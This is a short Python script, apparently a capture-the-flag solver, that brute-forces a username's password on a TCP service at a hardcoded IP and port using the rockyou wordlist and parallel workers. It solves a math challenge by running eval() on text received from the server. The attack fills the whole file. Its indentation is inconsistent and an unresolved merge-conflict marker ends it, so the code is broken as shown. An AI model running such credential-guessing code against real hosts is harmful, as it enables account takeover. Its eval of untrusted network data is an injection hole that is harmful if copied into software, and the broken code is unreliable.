import socket
import time     
import multiprocessing


wordlist = "/root/Downloads/rockyou.txt" # Point to wordlist file


def p_found(password):
    while (1 > 0):
   	 time.sleep(5)
   	 print("found: " + password)

def ssh_connect(password):
    host = "157.230.179.99" # IP address here
    port = 1337 # Port here
    username = "ejnorman84"

    t = 2
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    	s.connect((host, port))
    time.sleep(t)
    data = s.recv(10*1024) 	
    print(len(data))
    print(data)
    if (len(data) > 18):
   	 ans = eval(data[17:(data.index("=")-1)])
   	 s.send("{}\n".format(ans))
    else:
   	 s.send("")
   	 time.sleep(t)
   	 data = s.recv(10*1024)
   	 print(data)
   	 
   	 ans = eval(data[0:(data.index("=")-1)])
   	 s.send("{}\n".format(ans))
   	 
   	 
    time.sleep(t)
    data = s.recv(1024) 	# Receives 1024 bytes from IP/Port
    print("2")
    	print(data)
    s.send(username + "\n")
    time.sleep(t)
    data = s.recv(1024) 	# Receives 1024 bytes from IP/Port
    	print(data)
    s.send(password + "\n")
    time.sleep(t)
    data = s.recv(1024) 	# Receives 1024 bytes from IP/Port
    	print(data)
    print(password)
    if (data.find("Fail") == -1):
   	 p_found(password)
	 time.sleep(10000000)
   	 return 1
    return 0


def brute_force():
   
    words = []
    with open(wordlist,'r') as f:
   		 for line in f:
   			 for word in line.split():
      				 words.append(word)  
    

          	 
    p = multiprocessing.Pool(8)
    results = p.map(ssh_connect, words)
    p.close()
    p.join()
    success = list(filter(None, results))
    print("Done!!!")
    print(success)

    



if __name__ == '__main__':
	brute_force()

<<<<<<< HEAD

=======
>>>>>>> e6e14c14ae892335dbf613c4d6ca3517e765b733
